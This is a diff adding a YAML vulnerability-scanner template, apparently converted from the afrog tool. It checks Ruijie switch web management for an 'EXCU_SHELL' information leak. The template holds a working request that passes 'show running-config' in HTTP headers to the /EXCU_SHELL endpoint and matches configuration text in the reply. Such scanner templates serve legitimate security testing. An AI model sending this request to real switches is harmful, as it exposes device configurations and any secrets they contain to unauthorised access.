@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - headers:
+      Cmdnum: "1"
+      Command1: show running-config
+      Confirm1: "n"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Building configuration
+          - Current configuration
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/EXCU_SHELL'
+id: ruijie-excu-shell-disclosure
+info:
+  author: zan8in
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露
+  severity: high
+  tags: ruijie,disclosure,argus-import
